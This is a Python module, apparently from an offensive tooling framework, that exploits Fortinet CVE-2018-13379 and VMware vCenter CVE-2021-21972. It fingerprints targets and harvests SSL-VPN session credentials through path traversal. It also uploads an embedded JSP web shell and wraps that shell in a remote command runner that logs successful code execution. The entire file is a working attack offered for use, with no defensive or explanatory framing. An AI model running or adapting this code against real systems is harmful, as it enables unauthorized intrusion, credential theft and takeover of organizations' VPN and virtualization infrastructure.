"""Hardware/Appliance: Fortinet 2018-13379, vCenter 2021-21972."""
from __future__ import annotations
import re
import secrets

JSP = ('<%@page import="java.io.*"%><%String c=request.getParameter("c");'
       'Process p=Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",c});'
       'BufferedReader r=new BufferedReader(new InputStreamReader(p.getInputStream()));'
       'String l;while((l=r.readLine())!=null)out.println(l);%>')


def fort_detect(t) -> bool:
    try:
        import requests, urllib3
        urllib3.disable_warnings()
        r = requests.get(t.url + "/", timeout=7, verify=False)
        blob = (r.text + str(r.headers)).lower()
        return "fortigate" in blob or "fortinet" in blob or "sslvpn" in blob
    except Exception:
        return False


def fort_harvest(t, audit):
    import requests, urllib3
    urllib3.disable_warnings()
    out = ""
    for p in ["/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession",
              "/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession/"]:
        try:
            r = requests.get(t.url + p, timeout=10, verify=False)
            if r.status_code == 200 and ("var fgt_lang" in r.text or "sslvpn" in r.text):
                out = r.text
                break
        except Exception:
            pass
    if not out:
        return None
    m = re.findall(r"(\d{1,3}(?:\.\d{1,3}){3})\s*[\x00-\x1f ]{1,6}([^\x00-\x1f]{1,64})", out)
    creds = "; ".join(f"{a}:{b.strip()}" for a, b in m[:8] if b.strip())
    if creds:
        audit.write("harvest", "fortinet-creds", t.url, creds=creds[:300])
    return None


def vc_detect(t) -> bool:
    try:
        import requests, urllib3
        urllib3.disable_warnings()
        r = requests.get(t.url + "/ui/", timeout=7, verify=False)
        blob = (r.text + str(r.headers)).lower()
        return r.status_code == 200 and ("vsphere" in blob or "vcenter" in blob or "vmware" in blob)
    except Exception:
        return False


def vc_open(t, audit):
    import requests, urllib3
    urllib3.disable_warnings()
    tok = "v" + secrets.token_hex(4)
    name = tok + ".jsp"
    path = ("/ui/vropspluginui/rest/services/uploadova")
    s = requests.Session(); s.verify = False
    files = {"uploadFile": (name, JSP.encode(), "application/octet-stream")}
    try:
        s.post(t.url + path, files=files, timeout=25)
    except Exception:
        return None
    import time
    for _ in range(4):
        for url in (f"/ui/resources/{name}", f"/ui/{name}", f"/{name}"):
            try:
                r = s.get(t.url + url, params={"c": "id"}, timeout=8)
                if r.status_code == 200 and "uid=" in r.text:
                    class C:
                        def run(self, target, cmd, timeout=None, audit=None):
                            from .exploit import RunResult
                            rr = s.get(t.url + url, params={"c": cmd}, timeout=20)
                            if audit:
                                audit.write("vector", "rce_ok", getattr(target, "url", str(target)),
                                            vector="vcenter", cmd=cmd, head=rr.text[:200])
                            return RunResult(True, rr.text)
                        def proof(self, target, token, timeout=None, audit=None):
                            return token in self.run(target, f"echo {token}", audit=audit).stdout
                    audit.write("vector", "opened", t.url, vector="vcenter")
                    return C()
            except Exception:
                pass
        time.sleep(2)
    return None
